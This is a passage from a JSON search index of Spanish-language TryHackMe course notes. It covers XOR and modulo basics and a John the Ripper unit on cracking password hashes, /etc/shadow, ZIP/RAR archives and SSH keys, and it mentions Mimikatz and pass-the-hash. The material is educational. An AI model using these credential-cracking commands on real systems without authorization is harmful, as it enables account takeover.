contrario que el de los datos bancarios, estos cambian entre países."
  },
  {
    "title": "6. Basic Math",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/1-cryptography-basics/6-basic-math/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/1. Cryptography Basics/6. Basic Math.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 1. Cryptography Basics",
    "content": "Los fundamentos de la criptografía moderna recaen sobre las matemáticas. Para demostrar algunos algoritmos básicos cubriremos dos operaciones matemáticas usadas en varios algoritmos:\n\n- Operación XOR.\n- Operación Módulo.\n\n----------------\n<h2>Operación XOR</h2>\nXOR es la operación `or` eXclusivamente. Tiene la siguiente tabla de resultados:\n\n| A   | B   | A ⊕ B |\n| --- | --- | ----- |\n| 0   | 0   | 0     |\n| 0   | 1   | 1     |\n| 1   | 0   | 1     |\n| 1   | 1   | 0     |\nSe representa mediante el símbolo ⊕ o ^. Compara los dos bits y devuelve 1 sólo si son diferentes y 0 en el resto de casos.\n\nAl hacer XOR con los números 1010 y 1100 el resultado será: 0110.\n\nPara poner un ejemplo real:\n\n- C: Texto cifrado.\n- P: Texto plano.\n- K: Llave.\n\nSabemos que *C = P ⊕ K*. Si sabemos P y K, podemos recuperar C. Comenzamos con  *C ⊕ K = (P ⊕ K) ⊕ K*. También sabemos que *(P ⊕ K) ⊕ K = P ⊕ (K ⊕ K)* porque XOR es asociativa, y que *K ⊕ K = 0*. Consecuentemente, *(P ⊕ K) ⊕ K = P ⊕ (K ⊕ K) = P ⊕ 0 = P*.\n\n\n--------------\n<h2>Operación Módulo</h2>\nOtra operación usada mucho en criptografía es la de módulo, comúnmente escrita como `%` o `mod`. Esta operación rescata el resto de una división.\n\n- `25%5 = 0`: Porque 25/5 = 5 con resto 0.\n- `23%6 = 5`: Porque 3 * 6 =18 y 23 -18 = 5.\n- `23%7 = 2`: Porque 7 * 3 = 21 y 23 - 21 = 2.\n\nAlgo importante que notar sobre el módulo es que no es reversible. hay infinitos valores para x en `x%5 = 4`. La operación siempre devuelve un número entero (int) positivo entre `0` y `n - 1` en `a%n`."
  },
  {
    "title": "8. Custom Rules",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/4-john-the-ripper-the-basics/8-custom-rules/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/4. John the Ripper - The Basics/8. Custom Rules.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 4. John the Ripper - The Basics",
    "content": "<h2>¿Qué son las Reglas Personalizadas?</h2>\nPuedes definir tus propias reglas de mangling por las que John se guiará para crear contraseñas que probar. Son útiles cuando tienes información sobre tu objetivo.\n\n------------------\n<h2>Reglas Personalizadas Comunes</h2>\nMuchas organizaciones requieren un cierto nivel de complejidad de contraseñas para tratar de combatir ataques de diccionario. Es por esto que si intentas algo como `polopassword` no funcionará y te dará un mensaje pidiéndote, probablemente:\n\n- Una minúscula.\n- Una mayúscula.\n- Un número.\n- Un símbolo.\n\nLa complejidad de contraseñas es buena, sin embargo, podemos aprovecharnos de que la mayoría de usuarios será predecible en la colocación de estos caracteres. Para la contraseña de antes, la mayoría de los usuarios elegirá algo del siguiente estilo: `Polopassword1!`.\n\nEsto cumple los requisitos de complejidad de contraseñas, pero como atacantes conocedores de estadísticas podemos usar estos conocimientos a nuestro favor para crear reglas y diccionarios.\n\n------------------\n<h2>¿Cómo crear Reglas Personalizadas?</h2>\nLas reglas personalizadas se definen en el archivo `john.conf`. Este puede ser encontrado en `/opt/john/john.conf`.\n\nMiremos la sintaxis de estas reglas. Ten en cuenta que puedes definir una cantidad masiva de niveles de control en estas. Para ver todas las posibilidades puedes consultar la [documentación](https://www.openwall.com/john/doc/RULES.shtml). \n\nLa primera línea:\n\n`[List.Rules:THMRules]`: Se usa para definir el nombre de la regla. Esto es lo que usarás para llamar a tu regla en el argumento de John.\n\nUsamos regex para decir dónde cambian las palabras:\n\n- `Az`: Coge la palabra y la pone al final de caracteres que definamos.\n- `A0`: Coge la palabra y la pone al principio de caracteres que definamos.\n- `c`: Capitaliza el carácter en función de la posición.\n\nEstos pueden ser combinados para especificar lo que queremos modificar.\n\nPor último, debemos definir qué caracteres deberían ser añadidos. Hacemos esto añadiendo sets de caracteres entre corchetes `[ ]` donde deberían ser puestos seguido por comillas `\" \"` como modificadores. Algunos ejemplos:\n\n- `[0-9]`: Incluirá números del 0 al 9.\n- `[0]`: Incluirá sólo el número 0.\n- `[A-z]`: Incluirá mayúsculas y minúsculas.\n- `[A-Z]`: Incluirá sólo mayúsculas.\n- `[a-z]`: Incluirá sólo minúsculas.\n\nTen en cuenta que:\n\n- `[a]`: Sólo incluirá la \"a\".\n- `[!@#$%&]`: Incluirá los símbolos !, @, #, $, % y &.\n\nPara poner todo esto en práctica y crear contraseñas del estilo de `Polopassword1!`, haríamos algo así:\n\n`[List.Rules:PoloPassword]`\n`cAz\"[0-9] [!@#$%&]\"\n\n- `c`: Capitaliza la primera letra.\n- `Az`: Añade al final de la palabra:\n\t- `[0-9]`: Un número del 0 al 9.\n\t- `[!@#$%&]`: Uno de estos caracteres.\n\n-------------\n<h2>Usar Reglas Personalizadas</h2>\nPodríamos llamar a esta regla usando el argumento `--rule=PoloPassword`.\n\nComo comando completo: `john --wordlist=[ruta al diccionario] --rule=PoloPassword [ruta al archivo]`\n"
  },
  {
    "title": "11. Cracking SSH Keys with John",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/4-john-the-ripper-the-basics/11-cracking-ssh-keys-with-john/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/4. John the Ripper - The Basics/11. Cracking SSH Keys with John.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 4. John the Ripper - The Basics",
    "content": "Exploremos otro de los usos de John: crackear la contraseña de los archivos de claves SSH privadas como `id_rsa`.\n\n-----------------\n<h2>SSH2John</h2>\n¿Quién podría haberlo imaginado? Otra herramienta de conversión. La herramienta `ssh2john` convierte la clave privada `id_rsa` que se usa para iniciar sesión por SSH en formato hash con el que John puede trabajar. Si no tienes `ssh2john` instalado, puedes usar `/opt/john/ssh2john.py`. La sintaxis es:\n\n`ssh2john [archivo id_rsa] > [archivo de salida]`\n\n- `ssh2john`: Invoca a la herramienta.\n- `[archivo id_rsa]`: Ruta al archivo id_rsa.\n- `>`: Redirección.\n- `[archivo de salida]`: Donde se guardará el hash.\n\nPor ejemplo:\n\n`/opt/john/ssh2john.py id_rsa > id_rsa_hash.txt`\n\n-----------------\n<h2>Crackeo</h2>\nLe vamos a pasar el hash que hemos obtenido a John tal cual, como ya venimos haciendo. Un ejemplo de sintaxis es:\n\n`john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hashh.txt`\n"
  },
  {
    "title": "2. Basic Terms",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/4-john-the-ripper-the-basics/2-basic-terms/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/4. John the Ripper - The Basics/2. Basic Terms.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 4. John the Ripper - The Basics",
    "content": "<h2>¿Qué son los Hashes?</h2>\nUn hash es una manera de tomar una pieza de información de cualquier longitud y transformarla en otra de longitud fija. Este proceso oculta el valor original. El valor resultante se obtiene de pasar la información original por un algoritmo hasheador.\n\n-----------\n<h2>¿Qué los hace seguros?</h2>\nLas funciones hasheadoras están diseñadas para funcionar sólo en una dirección. Este problema computacional tiene sus orígenes en el problema matemático [P vs NP](https://www.youtube.com/watch?v=UR2oDYZ-Sao).\n\nEn ciencia computacional, P y NP son dos clases de problemas que nos ayudan a entender la eficiencia de los algoritmos:\n\n- **P (Polynomial Time):** La clase P cubre los problemas cuya solución puede ser encontrada en tiempo polinómico. Considera ordenar una lista en orden ascendente. Cuanto más larga sea la lista, mayor será el tiempo. Sin embargo, el incremento en tiempo no es exponencial.\n- **NP (Non-deterministic Polynomial Time):** Los problemas de esta clase son aquellos cuyos dada una solución, pueden ser comprobados rápidamente, aunque encontrar la respuesta en sí pueda ser difícil.\n\nAunque este problema y su complejidad real quedan muy fuera del alcance de esta lección, podemos extrapolar que hashear la información sería **P** mientras que des-hashearla sería **NP**.\n\n-------------\n<h2>¿Dónde entra en juego John?</h2>\nAunque el algoritmo no es reversible, eso no significa que crackear los hashes sea imposible. Si tienes la versión hasheada de una contraseña, y sabes qué algoritmo se utiliza, puedes usar un algoritmo para hashear una gran cantidad de pseudocontraseñas para obtener un diccionario.\n\nEste proceso se conoce como ataque de diccionario y John the Ripper es una herramienta que ejecuta estos ataques de fuerza bruta en muchos tipos de hashes.\n\nEn esta unidad nos centraremos en la versión más extendida de John the Ripper, **Jumbo John**."
  },
  {
    "title": "9. Cracking Password-Protected Files",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/4-john-the-ripper-the-basics/9-cracking-password-protected-files/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/4. John the Ripper - The Basics/9. Cracking Password-Protected Files.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 4. John the Ripper - The Basics",
    "content": "Sí, lo has leído bien, podemos usar John para crackear las contraseñas de los archivos zip protegidos por contraseña. Usaremos herramientas separadas de la suite de John para convertir los archivos `zip` a algo que John pueda entender.\n\n--------------------\n<h2>Zip2John</h2>\nSimilar a la herramienta `unshadow`, usaremos `zip2john` para convertir el archivo `zip` a un formato de hash que John pueda entender y con suerte crackear. El uso primario es:\n\n`zip2john [opciones] [archivo zip] > [archivo de salida]`\n\n- `[opciones]`: Permite pasarle opciones específicas a `zip2john`, aunque no debería de ser necesario.\n- `[archivo zip]`: La ruta al archivo zip que queremos crackear.\n- `>`: Redirección, crea un nuevo documento si no existe y lo sobreescribe si sí.\n- `[archivo de salida]`: Archivo en el que se guardará la salida del comando.\n\nPor ejemplo:\n\n`zip2john zipfile.zip > zip_hash.txt`\n\n-----------------\n<h2>Crackeo</h2>\nUna vez tenemos el hash, podemos dárselo directamente a John, como hicimos con `unshadow`.\n\n`john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt`\n"
  },
  {
    "title": "5. Cracking Windows Authentification Hashes",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/4-john-the-ripper-the-basics/5-cracking-windows-authentification-hashes/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/4. John the Ripper - The Basics/5. Cracking Windows Authentification Hashes.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 4. John the Ripper - The Basics",
    "content": "Ahora que entendemos la sintaxis básica y su uso, vamos a ver cómo crackear algo un poco más complicado. Algo que quizás incluso tengas que hacer en un entorno de penetración Red Team. Los hashes de autentificación son versiones hasheadas de las contraseñas guardadas por los sistemas operativos. Es posible crackearlos con fuerza bruta, a veces. Por lo general, para tener acceso a estos ya debemos ser un usuario con privilegios.\n\n--------------\n<h2>NTHash / NTLM</h2>\nNTHash es el formato de hash moderno que las máquinas Windows usan para guardar sus contraseñas (de usuarios y servicios). También se le llama comúnmente NTLM, que hace referencia a la versión previa de este formato, LM, así que NT LM.\n\nUn poco de historia: la designacion NT de Windows originalmente significaba \"New Technology\", para denotar a los productos no construidos para el SO MS-DOS. Con el tiempo el significado se diluyó hacia el nombre del sistema operativo.\n\nEn Windows, SAM (Security Account Manager) es usado para almacenar información de la cuenta del usuario. Se pueden adquirir los NTHash dumpeando la base de datos de SAM de una máquina Windows usando una herramienta como `Mimikatz` o usando la base de datos de Active Directory: `NTDS.dit`. Puede incluso que no tengas que romper el hash para conseguir una escalada de privilegios pues podrías llegar a ejecutar un ataque \"pass the hash\"."
  },
  {
    "title": "7. Single Crack Mode",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/4-john-the-ripper-the-basics/7-single-crack-mode/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/4. John the Ripper - The Basics/7. Single Crack Mode.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 4. John the Ripper - The Basics",
    "content": "Hasta el momento, hemos usado los diccionarios en `john` para realizar ataques de fuerza bruta. Pero John también tiene otro modo, llamado **Single Crack**. En este modo, John usa sólo la información dada del nombre de usuario y prueba posibles contraseñas usando heurística cambiando letras y números contenidos en dicho nombre.\n\n-------------\n<h2>Modificación de Palabras</h2>\nLa mejor manera de explicar el modo Single Crack y word mangling (modificación de palabras) es a través de un ejemplo:\n\nConsidera el nombre de usuario \"Markus\". Algunas posibles contraseñas serían:\n\n- Markus1, Markus2, Markus3, etc.\n- MArkus, MARkus, MASRKus, etc.\n- Markus!, Markus$, Markus*, etc.\n\nEsta técnica se conoce como **word mangling**. John construye su propio diccionario basándose en la información que le ha sido dada y usando un conjunto de reglas (mangling rules), que definen cómo se muta la palabra inicial.\n\n-------------\n<h2>GECOS</h2>\nLa implementación de John del word mangling también ofrece compatibilidad con el campo GECOS de los sistemas operativos UNIX. GECOS significa General Electric Comprehensive Operating System. En la última tarea hemos visto entradas para `shadow` y `passwd`. Si miramos de cerca veremos que los campos están separados por \":\". El quinto campo en el registro de la cuenta de usuario es el campo GECOS. Almacena información general sobre el usuario, como el nombre completo, número de oficina y número de teléfono entre otros. John puede tomar información guardada en esos registros como el nombre completo y el nombre del directorio home para añadirlo a su diccionario al crackear `/etc/shadow` con el modo single crack.\n\n----------------------------\n<h2>Usando el modo Single Crack</h2>\nPara usar el modo single crack, usamos casi la misma sintaxis que hemos usado hasta ahora, por ejemplo, si queremos crackear la contraseña de un usuario llamado \"Mike\", usando el modo single crack, escribiríamos:\n\n`john --single --format=[formato] [ruta al archivo]`\n\n- `--single`: Indica que queremos usar el modo single crack.\n- `--format=[formato]`: Es como siempre, aquí indicamos el formato.\n\nEjemplo de uso:\n\n`john --single --format=raw-sha256 hashes.txt`\n\n>[!NOTE] Si estamos crackeando hashes en modo single crack, necesitamos cambiar el formato del archivo que le damos a John para que entienda con qué información crear el diccionario. Hacemos esto añadiendo el nombre de usuario, es decir pasamos de `1efee03cdcb96d90ad48ccc7b8666033` -> `mike:1efee03cdcb96d90ad48ccc7b8666033`.\n\n"
  },
  {
    "title": "10. Cracking Password-Protected RAR Archives",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/4-john-the-ripper-the-basics/10-cracking-password-protected-rar-archives/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/4. John the Ripper - The Basics/10. Cracking Password-Protected RAR Archives.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 4. John the Ripper - The Basics",
    "content": "Podemos usar un proceso similar para obtener la contraseña de archivos RAR.\n\n-----------------\n<h2>Rar2John</h2>\nPrácticamente idéntico a la herramienta `zip2john`, usaremos la herramienta `rar2john` para convertir los archivos RAR en formato de hash que John pueda entender. La sintáxis básica es:\n\n`rar2john [archivo rar] > [archivo de salida]`\n\n- `rar2john`: Herramienta para convertir el RAR.\n- `[archivo rar]`: Ruta al archivo RAR.\n- `>`: Redireccionador.\n- `[archivo de salida]`: Nombre del archivo que contendrá el hash.\n\nPor ejemplo:\n\n`/opt/john/rar2john rarfile.rar > rar_hash.txt`\n\n---------------\n<h2>Crackeo</h2>\nPara obtener la contraseña del archivo usaremos el hash que hemos obtenido y un diccionario:\n\n`john --wordlist=/usr/share/wordlists/rockyou.txt rar_hash.txt`\n"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/4-john-the-ripper-the-basics/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/4. John the Ripper - The Basics/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 4. John the Ripper - The Basics",
    "content": "John the Ripper es una herramienta de crackeo de hashes y conocida y amada. Combina una rápida velocidad de crackeo con un amplio rango de hashes compatibles.\n\n-----------\n<h2>Pre-requisitos</h2>\nPara obtener el máximo beneficio se recomienda no comenzar esta unidad sin antes haber completado las tres predecesoras:\n\n- [[0. Cryptography Basics]]\n- [[0. Public Key Cryptography Basics]]\n- [[0. Hashing Basics]]\n\n--------------\n<h2>Objetivos de Aprendizaje</h2>\nAl completar esta unidad, habrás aprendido sobre el uso de John para:\n\n- Crackear hashes de autentificación de Windows.\n- Crackear hashes de `/etc/shadow`.\n- Crackear archivos ZIP protegidos por contraseña.\n- Crackear archivos RAR protegidos por contraseña.\n- Crackear claves SSH."
  },
  {
    "title": "0. John the Ripper - The Basics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/4-john-the-ripper-the-basics/0-john-the-ripper-the-basics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/4. John the Ripper - The Basics/0. John the Ripper - The Basics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 4. John the Ripper - The Basics",
    "content": "[[THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/4. John the Ripper - The Basics/1. Introduction]]\n[[2. Basic Terms]]\n[[3. Setting Up Your system]]\n[[4. Cracking Basic Hashes]]\n[[5. Cracking Windows Authentification Hashes]]\n[[6. Cracking letclshadow Hashes]]\n[[7. Single Crack Mode]]\n[[8. Custom Rules]]\n[[9. Cracking Password-Protected Files]]\n[[10. Cracking Password-Protected RAR Archives]]\n[[11. Cracking SSH Keys with John]]\n"
  },
  {
    "title": "3. Setting Up Your system",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/4-john-the-ripper-the-basics/3-setting-up-your-system/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/4. John the Ripper - The Basics/3. Setting Up Your system.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 4. John the Ripper - The Basics",
    "content": "A lo largo de esta unidad estaremos usando:\n\n- La versión de John the Ripper: Jumbo John.\n- El diccionario `rockyou.txt`.\n\n-------------\n<h2>Instalación</h2>\nJohn the Ripper está soportado en varios sistemas operativos, no sólo distros Linux. La versión más popular es Jumbo John.\n\n<h4>AttackBox y Kali Linux</h4>\nYa viene instalado. Puedes comprobarlo escribiendo `john` en la terminal.\n\n<h4>Otras distribuciones de Linux</h4>\nEn Fedora puedes instalarlo escribiendo `sudo dnf install john` y en Ubuntu `sudo apt install john`.\n\n----------------\n<h4>Instalarlo en Windows</h4>\nPara instalarlo en Windows necesitaremos descargar e instalar el binario comprimido para un sistema de [64 bits](https://www.openwall.com/john/k/john-1.9.0-jumbo-1-win64.zip) o de [32 bits](https://www.openwall.com/john/k/john-1.9.0-jumbo-1-win32.zip).\n\n-------------\n<h2>Diccionarios</h2>\nAhora que tenemos `john` debemos considerar otro componente indispensable, los diccionarios. Hay muchos diccionarios muy buenos, una buena colección la podemos encontrar en el repositorio [SecLists](https://github.com/danielmiessler/SecLists). Por lo general, en el directorio `/usr/share/wordlists` hay buenos diccionarios para diferentes propósitos.\n\n<h4>RockYou</h4>\nPara todas las tareas de esta unidad vamos a estar usando el diccionario `rockyou.txt` en la sección `/passwords/Leaked-Database`."
  },
  {
    "title": "6. Cracking letclshadow Hashes",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/4-john-the-ripper-the-basics/6-cracking-letclshadow-hashes/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/4. John the Ripper - The Basics/6. Cracking letclshadow Hashes.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 4. John the Ripper - The Basics",
    "content": "El archivo `/etc/shadow` es el archivo de Linux donde se almacenan las contraseñas hasheadas. También guarda otra información, como la fecha del último cambio de contraseña o información sobre la expiración de esta. Sólo el usuario root puede acceder a este archivo.\n\n--------------\n<h2>Unshadoweando</h2>\nJohn puede ser muy especialito sobre los formatos e información que necesita para crackear un hash. Por esta razón, para crackear las contraseñas de `/etc/shadow` necesitas combinarlo con el archivo `/etc/passwd`. Para hacer esto usamos una herramienta que se llama `unshadow`. La sintaxis básica de `unshadow` es la siguiente:\n\n`unshadow [ruta a passwd] [ruta a shadow]`\n\n- `unshadow`: Llama a la herramienta `unshadow`.\n- `[ruta a passwd]`: Especifica el archivo que contiene passwd.\n- `[ruta a shadow]`: Especifica el archivo que contiene shadow.\n\nPor ejemplo:\n\n`unshadow local_passwd local_shadow > unshadowed.txt`\n\n>[!NOTE] Al usar los archivos passwd y shadow, podemos usar los archivos enteros o sólo las líneas relevantes.\n\n-----------\n<h2>Crackeando</h2>\nPodemos después darle el resultado de `unshadow` a `john`. No necesitaríamos especificar un modo, pues hemos hecho el input específicamente para `john`. Sin embargo, en algunos casos, necesitaremos especificar el formato como hacíamos antes.\n\n`john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt`\n"
  },
  {
    "title": "4. Cracking Basic Hashes",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/4-john-the-ripper-the-basics/4-cracking-basic-hashes/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/4. John the Ripper - The Basics/4. Cracking Basic Hashes.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 4. John the Ripper - The Basics",
    "content": "Hay muchas maneras de usar John the Ripper para crackear hashes simples. Veremos unas cuantas antes de ponernos a crackear nosotros mismos.\n\n------------------\n<h2>Sintaxis Básica de John</h2>\nLa sintaxis básica de John the Ripper es la siguiente:\n\n`john [opciones] [ruta de archivo]`\n\n- `john`: Para llamar a la herramienta John the Ripper.\n- `[opciones]`: Especifica las opciones que queremos usar.\n- `[ruta al archivo]`: El archivo que contiene el hash que queremos crackear.\n\n-----------------\n<h2>Crackeo Automático</h2>\nJohn tiene propiedades internas que detectan el tipo de hash que tiene delante para aplicar las reglas necesarias. Aunque esta no siempre es la mejor idea porque puede no ser preciso. Para usarlo hacemos: `john --wordlist=[ruta a diccionario] [ruta al archivo]`.\n\n- `--wordlist=`: Indica que vamos a proporcionar un diccionario.\n- `[ruta a diccionario]`: La ruta al diccionario que vamos a usar.\n\nPor ejemplo:\n\n`john --wordlist=/usr/share/wordlists/rockyou.txt hash_to_crack.txt`.\n\n----------------\n<h2>Identificar el Hash</h2>\nA veces John no lo hace bien con el reconocimiento automático del hash, pero podemos usar otras herramientas para identificar el formato. Hay varias maneras de hacerlo, como usando un identificador de hash online como [este](https://hashes.com/en/tools/hash_identifier). También hay herramientas de consola como [esta](https://gitlab.com/kalilinux/packages/hash-identifier/-/tree/kali/master), llamada hash-identifier, hecha con Python.\n\nPara obtenerla puedes usar `wget` o `curl`, para descargarte el `.py` de la página web.\n\n```bash\nuser@TryHackMe$ wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py $ python3 hash-id.py    #########################################################################    #     __  __                     __           ______    _____           #    #    /\\ \\/\\ \\                   /\\ \\         /\\__  _\\  /\\  _ `\\         #    #    \\ \\ \\_\\ \\     __      ____ \\ \\ \\___     \\/_/\\ \\/  \\ \\ \\/\\ \\        #    #     \\ \\  _  \\  /'__`\\   / ,__\\ \\ \\  _ `\\      \\ \\ \\   \\ \\ \\ \\ \\       #    #      \\ \\ \\ \\ \\/\\ \\_\\ \\_/\\__, `\\ \\ \\ \\ \\ \\      \\_\\ \\__ \\ \\ \\_\\ \\      #    #       \\ \\_\\ \\_\\ \\___ \\_\\/\\____/  \\ \\_\\ \\_\\     /\\_____\\ \\ \\____/      #    #        \\/_/\\/_/\\/__/\\/_/\\/___/    \\/_/\\/_/     \\/_____/  \\/___/  v1.2 #    #                                                             By Zion3R #    #                                                    www.Blackploit.com #    #                                                   Root@Blackploit.com #    ######################################################################### \n--------------------------------------------------  HASH: 2e728dd31fb5949bc39cac5a9f066498  Possible Hashs: [+] MD5 [+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))\n```\n\n----------------\n<h2>Crackeo de Formatos Específicos</h2>\nUna vez que hemos identificado el formato del hash, podemos decirle a John de qué tipo de hash se trata:\n\n`john --format=[formato] --wordlist=[ruta a diccionario] [ruta al archivo]`\n\n- `--format=`: Especifica que vamos a introducir el tipo de hash.\n- `[format]`: El formato del hash.\n\nPor ejemplo:\n\n`john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashToCrack.txt`\n\n>[!NOTE] Cuando le decimos a John el formato, si este es estándar, debemos precederlo de un \"raw-\". Para asegurarnos de si tenemos que poner el \"raw-\" o no podemos consultarlo con `john --list=formats | grep -iF \"md5\"`, por ejemplo.\n\n"
  },
  {
    "title": "3. Linux Fundamentals 3",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/2-linux-fundamentals/3-linux-fundamentals-3/3-linux-fundamentals-3/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/2. Linux Fundamentals/3. Linux Fundamentals 3/3. Linux Fundamentals 3.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 2. Linux Fundamentals > 3. Linux Fundamentals 3",
    "content": "[[0. Linux Fundamentals 3]]"
  },
  {
    "title": "1. Linux Fundamentals 1",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/2-linux-fundamentals/1-linux-fundamentals-1/1-linux-fundamentals-1/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/2. Linux Fundamentals/1. Linux Fundamentals 1/1. Linux Fundamentals 1.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 2. Linux Fundamentals > 1. Linux Fundamentals 1",
    "content": "[[0. Linux Fundamentals 1]]"
  },
  {
    "title": "2. Linux Funadmentals 2",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/2-linux-fundamentals/2-linux-fundamentals-2/2-linux-funadmentals-2/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/2. Linux Fundamentals/2. Linux Fundamentals 2/2. Linux Funadmentals 2.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 2. Linux Fundamentals > 2. Linux Fundamentals 2",
    "content": "[[0. Linux Fundamentals 2]]"
  },
  {
    "title": "4. Linux Fundamentals",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/4-linux-fundamentals/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/4. Linux Fundamentals.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals",
    "content": "1. [[0. Linux Fundamentals 1]]\n2. [[0. Linux Fundamentals 2]]\n3. [[0. Linux Fundamentals 3]]\n"
  },
  {
    "title": "5. Windows Fundamentals",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/5-windows-fundamentals/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/5. Windows Fundamentals.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals",
    "content": "1. [[0. Windows Fundamentals 1]]\n2. [[0. Windows Fundamentals 2]]\n3. [[0. Windows Fundamentals 3]]\n"
  },
  {
    "title": "1. Introduction to cybersecurity",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-introduction-to-cybersecurity/1-introduction-to-cybersecurity/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/1. Introduction to cybersecurity.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 1. Introduction to cybersecurity",
    "content": "1. [[THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/1. Offensive Security Intro/0. Offensive Security Intro]]\n2. [[0. Deffensive Security Intro]]\n3. [[THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/3. Careers in Cyber/0. Careers in Cyber]]"
  },
  {
    "title": "3. How the Web Works",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/3-how-the-web-works/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/3. How the Web Works.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works",
    "content": "1. [[0. DNS in Detail]]\n2. [[0. HTTP in Detail]]\n3. [[0. How Websites Work]]\n4. [[0. Putting it All Together]]\n"
  },
  {
    "title": "2. Network Fundamentals",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/2-network-fundamentals/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/2. Network Fundamentals.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals",
    "content": "1. [[0. What is Networking]]\n2. [[0. Introduction to LAN]]\n3. [[0. OSI Model]]\n4. [[0. Packets and Frames]]\n5. [[0. Extending your Network]]\n"
  },
  {
    "title": "4. DHCP",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/2-introduction-to-lan/4-dhcp/",
